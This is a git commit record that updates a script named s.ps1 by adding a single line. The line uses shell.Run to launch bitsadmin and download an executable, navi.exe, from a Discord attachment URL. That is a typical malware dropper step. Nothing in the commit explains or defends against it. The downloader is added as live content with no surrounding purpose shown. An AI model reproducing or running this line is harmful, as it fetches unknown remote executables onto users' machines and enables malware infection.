803423f3cdac4882e9183941df9ce551324803f7
drdonuttfanforever-stack <drdonuttfanforever@gmail.com>
2026-07-27 20:53:51 +0200

    Update s.ps1

--- s.ps1
+++ s.ps1
@@ -1,1 +1,1 @@
-
+shell.Run "bitsadmin /transfer d /download /priority high ""https://cdn.discordapp.com/attachments/1530596353376387113/1530742385942859896/navi.exe?ex=6a675730&is=6a6605b0&hm=78269418c568d8a15e7c36ffb4929435a51b8278adf527d616de6c5a8793d07d&""
